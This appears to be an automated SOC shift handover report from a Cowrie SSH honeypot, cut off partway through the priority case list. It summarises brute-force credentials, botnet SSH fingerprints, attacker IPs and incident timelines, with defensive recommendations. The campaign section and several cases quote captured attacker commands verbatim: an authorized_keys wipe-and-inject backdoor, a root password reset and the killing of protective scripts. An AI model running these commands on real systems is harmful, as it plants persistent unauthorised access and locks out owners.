# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-24 |
| **Generated At** | 2026-04-24T17:02:40Z |
| **Shift Time** | 17:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **78** |
| Confirmed Threats | **74** |
| False Positives Filtered | **4** (5.1%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **8** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **67** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **20** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `345gs5662d34` | 11 |
| `user` | 3 |
| `a` | 2 |
| `nil` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `` | 6 |
| `a` | 2 |
| `admin` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 11 |
| `root` | `` | 4 |
| `a` | `a` | 2 |
| `nil` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `------fuck------` | `91.99.206.46` | 2026-04-24T15:54:43 |
| `root` | `Dd112211` | `14.103.63.16` | 2026-04-24T16:12:11 |
| `root` | `Root321` | `115.93.19.12` | 2026-04-24T16:15:22 |
| `root` | `3245gs5662d34` | `115.93.19.12` | 2026-04-24T16:15:26 |
| `root` | `Root@` | `115.93.19.12` | 2026-04-24T16:17:34 |
| `root` | `` | `84.216.60.18` | 2026-04-24T16:19:06 |
| `root` | `` | `31.56.209.39` | 2026-04-24T16:19:07 |
| `root` | `p@ssw0rd123` | `115.93.19.12` | 2026-04-24T16:19:45 |
| `root` | `XXzz000` | `115.93.19.12` | 2026-04-24T16:21:46 |
| `root` | `Root8888$` | `115.93.19.12` | 2026-04-24T16:23:49 |
| `root` | `yy123456` | `115.93.19.12` | 2026-04-24T16:30:02 |
| `root` | `nPSpP4PBW0` | `115.93.19.12` | 2026-04-24T16:34:15 |
| `root` | `admin01` | `115.93.19.12` | 2026-04-24T16:38:31 |
| `root` | `server@2025` | `115.93.19.12` | 2026-04-24T16:42:35 |
| `root` | `Qwe@12345` | `115.93.19.12` | 2026-04-24T16:46:43 |
| `root` | `System@123` | `115.93.19.12` | 2026-04-24T16:53:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **78** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 50 |
| Go SSH scanner | 21 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 50 | 4 |
| `c118de82e19e...` | Mirai/variant | 20 | 2 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 50 | 4 | Modern SSH client |
| `c118de82e19e...` | Go SSH scanner | 20 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:IyufyJOLLmKP"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.63.16`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `115.93.19.12`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **10** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS3462` | Data Communication Business Group | 1 | MEDIUM |
| `AS24940` | Hetzner Online GmbH | 1 | MEDIUM |
| `AS8434` | Telenor Sverige AB | 1 | HIGH |
| `AS209373` | SWISSNET LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4331fa964e19

| Field | Detail |
|---|---|
| **Source IP** | `91.99.206[.]46` |
| **First Seen** | 2026-04-24 15:54 |
| **Last Seen** | 2026-04-24 15:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 15:54:41` | `cowrie.session.connect` |
| `2026-04-24 15:54:42` | `cowrie.client.version` |
| `2026-04-24 15:54:42` | `cowrie.client.kex` |
| `2026-04-24 15:54:43` | `cowrie.login.success` |
| `2026-04-24 15:54:43` | `cowrie.session.params` |
| `2026-04-24 15:54:43` | `cowrie.command.input` |
| `2026-04-24 15:54:43` | `cowrie.log.closed` |
| `2026-04-24 15:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.206[.]46` to AbuseIPDB if not already reported
- [ ] Block `91.99.206[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39fdf8e600a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.63[.]16` |
| **First Seen** | 2026-04-24 16:12 |
| **Last Seen** | 2026-04-24 16:12 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IyufyJOLLmKP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:12:10` | `cowrie.session.connect` |
| `2026-04-24 16:12:10` | `cowrie.client.version` |
| `2026-04-24 16:12:10` | `cowrie.client.kex` |
| `2026-04-24 16:12:11` | `cowrie.login.success` |
| `2026-04-24 16:12:11` | `cowrie.session.params` |
| `2026-04-24 16:12:11` | `cowrie.command.input` |
| `2026-04-24 16:12:11` | `cowrie.command.failed` |
| `2026-04-24 16:12:12` | `cowrie.log.closed` |
| `2026-04-24 16:12:12` | `cowrie.session.params` |
| `2026-04-24 16:12:12` | `cowrie.command.input` |
| `2026-04-24 16:12:13` | `cowrie.session.file_download` |
| `2026-04-24 16:12:13` | `cowrie.log.closed` |
| `2026-04-24 16:12:28` | `cowrie.session.params` |
| `2026-04-24 16:12:28` | `cowrie.command.input` |
| `2026-04-24 16:12:29` | `cowrie.log.closed` |
| `2026-04-24 16:12:29` | `cowrie.session.params` |
| `2026-04-24 16:12:29` | `cowrie.command.input` |
| `2026-04-24 16:12:29` | `cowrie.log.closed` |
| `2026-04-24 16:12:30` | `cowrie.session.params` |
| `2026-04-24 16:12:30` | `cowrie.command.input` |
| `2026-04-24 16:12:30` | `cowrie.session.file_download` |
| `2026-04-24 16:12:30` | `cowrie.log.closed` |
| `2026-04-24 16:12:30` | `cowrie.session.params` |
| `2026-04-24 16:12:30` | `cowrie.command.input` |
| `2026-04-24 16:12:30` | `cowrie.log.closed` |
| `2026-04-24 16:12:31` | `cowrie.session.params` |
| `2026-04-24 16:12:31` | `cowrie.command.input` |
| `2026-04-24 16:12:31` | `cowrie.log.closed` |
| `2026-04-24 16:12:31` | `cowrie.session.params` |
| `2026-04-24 16:12:31` | `cowrie.command.input` |
| `2026-04-24 16:12:31` | `cowrie.command.input` |
| `2026-04-24 16:12:31` | `cowrie.log.closed` |
| `2026-04-24 16:12:32` | `cowrie.session.params` |
| `2026-04-24 16:12:32` | `cowrie.command.input` |
| `2026-04-24 16:12:32` | `cowrie.log.closed` |
| `2026-04-24 16:12:32` | `cowrie.session.params` |
| `2026-04-24 16:12:32` | `cowrie.command.input` |
| `2026-04-24 16:12:32` | `cowrie.log.closed` |
| `2026-04-24 16:12:33` | `cowrie.session.params` |
| `2026-04-24 16:12:33` | `cowrie.command.input` |
| `2026-04-24 16:12:33` | `cowrie.log.closed` |
| `2026-04-24 16:12:34` | `cowrie.session.params` |
| `2026-04-24 16:12:34` | `cowrie.command.input` |
| `2026-04-24 16:12:34` | `cowrie.log.closed` |
| `2026-04-24 16:12:34` | `cowrie.session.params` |
| `2026-04-24 16:12:34` | `cowrie.command.input` |
| `2026-04-24 16:12:35` | `cowrie.log.closed` |
| `2026-04-24 16:12:35` | `cowrie.session.params` |
| `2026-04-24 16:12:35` | `cowrie.command.input` |
| `2026-04-24 16:12:35` | `cowrie.log.closed` |
| `2026-04-24 16:12:35` | `cowrie.session.params` |
| `2026-04-24 16:12:35` | `cowrie.command.input` |
| `2026-04-24 16:12:35` | `cowrie.log.closed` |
| `2026-04-24 16:12:36` | `cowrie.session.params` |
| `2026-04-24 16:12:36` | `cowrie.command.input` |
| `2026-04-24 16:12:36` | `cowrie.log.closed` |
| `2026-04-24 16:12:36` | `cowrie.session.params` |
| `2026-04-24 16:12:36` | `cowrie.command.input` |
| `2026-04-24 16:12:36` | `cowrie.log.closed` |
| `2026-04-24 16:12:37` | `cowrie.session.params` |
| `2026-04-24 16:12:37` | `cowrie.command.input` |
| `2026-04-24 16:12:37` | `cowrie.log.closed` |
| `2026-04-24 16:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.63[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.63[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e91263c9ab

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:15 |
| **Last Seen** | 2026-04-24 16:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:15:22` | `cowrie.session.connect` |
| `2026-04-24 16:15:22` | `cowrie.client.version` |
| `2026-04-24 16:15:22` | `cowrie.client.kex` |
| `2026-04-24 16:15:22` | `cowrie.login.success` |
| `2026-04-24 16:15:23` | `cowrie.session.params` |
| `2026-04-24 16:15:23` | `cowrie.command.input` |
| `2026-04-24 16:15:23` | `cowrie.command.failed` |
| `2026-04-24 16:15:23` | `cowrie.log.closed` |
| `2026-04-24 16:15:23` | `cowrie.session.params` |
| `2026-04-24 16:15:23` | `cowrie.command.input` |
| `2026-04-24 16:15:23` | `cowrie.session.file_download` |
| `2026-04-24 16:15:23` | `cowrie.log.closed` |
| `2026-04-24 16:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed78e7f0ed6a

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:15 |
| **Last Seen** | 2026-04-24 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:15:25` | `cowrie.session.connect` |
| `2026-04-24 16:15:25` | `cowrie.client.version` |
| `2026-04-24 16:15:26` | `cowrie.client.kex` |
| `2026-04-24 16:15:26` | `cowrie.login.success` |
| `2026-04-24 16:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6bdfd853f0d

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:17 |
| **Last Seen** | 2026-04-24 16:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:17:33` | `cowrie.session.connect` |
| `2026-04-24 16:17:33` | `cowrie.client.version` |
| `2026-04-24 16:17:33` | `cowrie.client.kex` |
| `2026-04-24 16:17:34` | `cowrie.login.success` |
| `2026-04-24 16:17:34` | `cowrie.session.params` |
| `2026-04-24 16:17:34` | `cowrie.command.input` |
| `2026-04-24 16:17:34` | `cowrie.command.failed` |
| `2026-04-24 16:17:34` | `cowrie.log.closed` |
| `2026-04-24 16:17:34` | `cowrie.session.params` |
| `2026-04-24 16:17:34` | `cowrie.command.input` |
| `2026-04-24 16:17:35` | `cowrie.session.file_download` |
| `2026-04-24 16:17:35` | `cowrie.log.closed` |
| `2026-04-24 16:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e38471843eb

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:17 |
| **Last Seen** | 2026-04-24 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:17:37` | `cowrie.session.connect` |
| `2026-04-24 16:17:37` | `cowrie.client.version` |
| `2026-04-24 16:17:37` | `cowrie.client.kex` |
| `2026-04-24 16:17:37` | `cowrie.login.success` |
| `2026-04-24 16:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c307ac9b6ae1

| Field | Detail |
|---|---|
| **Source IP** | `84.216.60[.]18` |
| **First Seen** | 2026-04-24 16:19 |
| **Last Seen** | 2026-04-24 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:19:05` | `cowrie.session.connect` |
| `2026-04-24 16:19:05` | `cowrie.client.version` |
| `2026-04-24 16:19:06` | `cowrie.client.kex` |
| `2026-04-24 16:19:06` | `cowrie.login.success` |
| `2026-04-24 16:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.216.60[.]18` to AbuseIPDB if not already reported
- [ ] Block `84.216.60[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22940c2f6adf

| Field | Detail |
|---|---|
| **Source IP** | `84.216.60[.]18` |
| **First Seen** | 2026-04-24 16:19 |
| **Last Seen** | 2026-04-24 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:19:06` | `cowrie.session.connect` |
| `2026-04-24 16:19:06` | `cowrie.client.version` |
| `2026-04-24 16:19:06` | `cowrie.client.kex` |
| `2026-04-24 16:19:07` | `cowrie.login.success` |
| `2026-04-24 16:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.216.60[.]18` to AbuseIPDB if not already reported
- [ ] Block `84.216.60[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64683d470e4c

| Field | Detail |
|---|---|
| **Source IP** | `31.56.209[.]39` |
| **First Seen** | 2026-04-24 16:19 |
| **Last Seen** | 2026-04-24 16:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh, cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
` |
| **TTPs (MITRE)** | T1057 · T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:19:06` | `cowrie.session.connect` |
| `2026-04-24 16:19:06` | `cowrie.client.version` |
| `2026-04-24 16:19:07` | `cowrie.client.kex` |
| `2026-04-24 16:19:07` | `cowrie.login.success` |
| `2026-04-24 16:19:08` | `cowrie.client.size` |
| `2026-04-24 16:19:08` | `cowrie.session.params` |
| `2026-04-24 16:19:09` | `cowrie.command.input` |
| `2026-04-24 16:19:09` | `cowrie.command.input` |
| `2026-04-24 16:19:09` | `cowrie.command.failed` |
| `2026-04-24 16:19:09` | `cowrie.command.input` |
| `2026-04-24 16:19:14` | `cowrie.log.closed` |
| `2026-04-24 16:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.209[.]39` to AbuseIPDB if not already reported
- [ ] Block `31.56.209[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d111d490460c

| Field | Detail |
|---|---|
| **Source IP** | `31.56.209[.]39` |
| **First Seen** | 2026-04-24 16:19 |
| **Last Seen** | 2026-04-24 16:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh, cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
` |
| **TTPs (MITRE)** | T1057 · T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:19:07` | `cowrie.session.connect` |
| `2026-04-24 16:19:07` | `cowrie.client.version` |
| `2026-04-24 16:19:07` | `cowrie.client.kex` |
| `2026-04-24 16:19:08` | `cowrie.login.success` |
| `2026-04-24 16:19:08` | `cowrie.client.size` |
| `2026-04-24 16:19:08` | `cowrie.session.params` |
| `2026-04-24 16:19:08` | `cowrie.command.input` |
| `2026-04-24 16:19:08` | `cowrie.command.input` |
| `2026-04-24 16:19:08` | `cowrie.command.failed` |
| `2026-04-24 16:19:08` | `cowrie.command.input` |
| `2026-04-24 16:19:13` | `cowrie.log.closed` |
| `2026-04-24 16:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.209[.]39` to AbuseIPDB if not already reported
- [ ] Block `31.56.209[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53dadcab8f93

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:19 |
| **Last Seen** | 2026-04-24 16:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:19:45` | `cowrie.session.connect` |
| `2026-04-24 16:19:45` | `cowrie.client.version` |
| `2026-04-24 16:19:45` | `cowrie.client.kex` |
| `2026-04-24 16:19:45` | `cowrie.login.success` |
| `2026-04-24 16:19:46` | `cowrie.session.params` |
| `2026-04-24 16:19:46` | `cowrie.command.input` |
| `2026-04-24 16:19:46` | `cowrie.command.failed` |
| `2026-04-24 16:19:46` | `cowrie.log.closed` |
| `2026-04-24 16:19:46` | `cowrie.session.params` |
| `2026-04-24 16:19:46` | `cowrie.command.input` |
| `2026-04-24 16:19:46` | `cowrie.session.file_download` |
| `2026-04-24 16:19:46` | `cowrie.log.closed` |
| `2026-04-24 16:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eaf9e18339b

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:19 |
| **Last Seen** | 2026-04-24 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:19:48` | `cowrie.session.connect` |
| `2026-04-24 16:19:48` | `cowrie.client.version` |
